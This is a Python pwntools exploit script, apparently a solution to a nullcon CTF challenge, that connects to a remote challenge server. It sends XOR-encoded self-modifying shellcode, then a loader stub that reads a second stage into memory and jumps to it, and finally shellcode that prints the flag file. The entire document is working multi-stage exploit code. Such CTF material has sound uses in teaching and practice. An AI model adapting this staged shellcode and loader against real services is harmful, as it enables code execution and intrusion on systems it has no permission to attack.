from pwn import *

context.os = 'linux'
context.arch = 'amd64'

encode_d = '''
push rsi
pop rcx
xor al,0x56
xor BYTE PTR [rcx+0x30],al
xor al,0x4E
xor al,0x44
xor BYTE PTR [rcx+0x31],al
xor al,0x30
xor al,0x6c
'''

loader = '''
mov rdx,0x1000
add rsi,0x100
xor rax,rax
syscall
jmp rsi
'''



p = remote("pwn.ctf.nullcon.net",4010)

shellcode = asm(encode_d)+"\x59"*0x30
main = asm(shellcraft.amd64.linux.cat("flag"))

p.send(shellcode)
sleep(0.3)
p.send("A"*0x32+asm(loader))#REAL SHELLCODE
sleep(0.3)
p.send(main)
p.interactive()